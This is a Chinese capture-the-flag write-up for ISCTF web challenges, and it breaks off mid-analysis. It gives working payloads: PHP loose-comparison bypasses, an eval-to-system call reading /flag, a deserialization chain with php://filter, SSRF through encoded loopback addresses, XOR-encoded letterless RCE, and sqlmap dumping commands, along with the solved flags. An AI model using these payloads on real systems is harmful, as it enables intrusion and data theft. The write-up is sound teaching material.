class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST1必须是数字，POST1和POST2不相等，但是他们的md5值要相等。</p><p>这里用到了PHP特性的知识，md5弱比较。</p><p>原理：</p><blockquote><p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，会被认为是数字。</p></blockquote><p>Payload1：<code>http://120.79.18.34:20867/?NAME=1&amp;P0ST1=0e545993274517709034328855841020&amp;P0ST2=s878926199a</code></p><p>第二层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里要求$GET1不能为数字，而且$GET1又等于0，并且$GET2不能为数字，值大于678。</p><p>弱类型比较：</p><blockquote><p>php 中0 与任何字符串比较都为 true，因为字符串被强制转换（截断）后都成了 0。</p></blockquote><p>Payload2：<code>GET1=a&amp;GET2=6782s</code></p><p>前半段的flag要经过hex编码，后半段经过base64解码后可以得到一个unicode再解码即可。</p><p>ISCTF{4f759692-a911-4f11-bf22-ddaa305514c0}</p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求preg_match($pattern,$str,$arr)，就是pattern要在str内，注意#是界定符，所以这俩#都不能加。<code>str=\\\\\\\\/Ilikeisctf</code>。</p><p>num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后等于要36。</p><p>fuzz一下，exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">127</span>; <span class="variable">$i</span>++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="string">&#x27;36&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:<code>http://120.79.18.34:20545/?str=\\\\\\\\/Ilikeisctf&amp;num=36%0C&amp;cmd=system(&#39;cat /flag&#39;);</code></p><p>ISCTF{59551edf-ece1-4878-a4a8-7d10e0dbfb19}</p><h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化</p><p>这个题目就是一个反序列化加一个php伪协议的利用。 利用include执行php伪协议造成文件读取 主要是绕过在执行析构函数的时候绕过dog会把cat内的a属性给变成I’m a vicious dog, Kitty 利用引用绕过</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></figure><p>解释一下<code>$this-&gt;b = &amp;$this-&gt;a;</code>中&amp;是取地址符号，意思是b将指向a的地址空间，这时a和b都是指向同一个地址空间，给b赋值就相当于给a赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:cat=O:3:%22cat%22:3&#123;s:1:%22a%22;N;s:1:%22b%22;R:2;s:1:%22c%22;O:5:%22mouse%22:1&#123;s:1:%22v%22;s:52:%22php://filter/convert.base64-encode/resource=flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64解码一下即可。</p><p>ISCTF{c98bfcc5-5688-4c9f-b11a-b61f3ff01b9f}</p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>这里有个this可以点击，然后提示让我们从本地访问，可以看到flag在www目录下。</p><p><img src="/posts/cbb4/image-20221105222032500.png" alt="image-20221105222032500"></p><p>看源码，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;urls&#x27;]))&#123;</span><br><span class="line">$urls = $_GET[&#x27;urls&#x27;];</span><br><span class="line">$url_host = parse_url($urls,PHP_URL_HOST);</span><br><span class="line">//Do something~~~~</span><br><span class="line">curl_get($urls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是让我们传一个url地址，一道ssrf。</p><p>先尝试<code>?urls=http://127.0.0.1/flag.php</code>发现被过滤了，localhost也不行。</p><p><img src="/posts/cbb4/image-20221105222956977.png" alt="image-20221105222956977"></p><p>尝试把127.0.0.1转化为其他进制试试看（也是能访问的）</p><blockquote><p>2130706433 10进制 <a href="http://127.0.0.1/">http://2130706433</a><br>017700000001 8进制 <a href="http://127.0.0.1/">http://017700000001</a><br>7F000001 16进制 <a href="http://127.0.0.1/">http://0x7F000001</a></p></blockquote><p>尝试10进制可以,<code>?urls=http://2130706433/flag.php</code></p><p>还有一种解法，看到注释里Do something~~~~就是对urls做了些处理，php里并没有curl_get函数，parse_url对url进行了分割。那么可以可以猜测curl_get函数是获得资源的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>ISCTF{c706d632-5edf-4c4b-bf52-a3676c8411d9}</p><h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="keyword">eval</span>(<span class="variable">$code</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你能拿到flag吗？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了数字和字母，很明显无数字字母rce。</p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;tac /f*&quot;;</span><br><span class="line">echo &quot;(\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%&quot;.dechex(ord($a[$i])^0xff);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;^\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%ff&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;)&quot;;</span><br></pre></td></tr></table></figure><p>Payload:<code>?shell=(&quot;%8c%86%8c%8b%9a%92&quot;^&quot;%ff%ff%ff%ff%ff%ff&quot;)(&quot;%8b%9e%9c%df%d0%99%d5&quot;^&quot;%ff%ff%ff%ff%ff%ff%ff&quot;);</code></p><p>ISCTF{11bdd027-5e99-4e21-b066-02dc1c125724}</p><h2 id="傻注"><a href="#傻注" class="headerlink" title="傻注"></a>傻注</h2><p>找一下登录界面login.php</p><p><img src="/posts/cbb4/04c21f4583e14b4f9069deccc6f4d4d8.png" alt="img"></p><p>根据题目猜测，这是一道sql注入的题目</p><p>burp suit简单扫一下，发现存在ua注入，直接sqlmap一把梭</p><p>查看数据库<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 --dbs</code></p><p><img src="/posts/cbb4/4b8a9a503af6421ab11c8905eda0dff1.png" alt="img"></p><p>查看表<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf --tables</code></p><p><img src="/posts/cbb4/c7ec92e83c96491aab2452445047b15f.png" alt="img"></p><p>查看user_agents内容</p><p><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf -T user_agents --columns --dump</code></p><p><img src="/posts/cbb4/b5c59d4a63654969a7bb6f5c0320d79a.png" alt="img"></p><p>得到flag</p><h2 id="easy-onlineshell"><a href="#easy-onlineshell" class="headerlink" title="easy-onlineshell"></a>easy-onlineshell</h2><p>提示我们先扫描一下，dirsearch扫描后发现<a href="http://www.zip源码泄露./">www.zip源码泄露。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import flask</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = flask.<span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/www.zip&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">return_SourceCode</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    elif flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.<span class="title function_ invoke__">run</span>([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(debug=True)</span><br></pre></td></tr></table></figure><p>分析代码发现是在&#x2F;rce这个路由情况下就可以通过POST传入参数act，然后传入的内容的首位和末位都会被裁剪，然后再执行传入的参数。 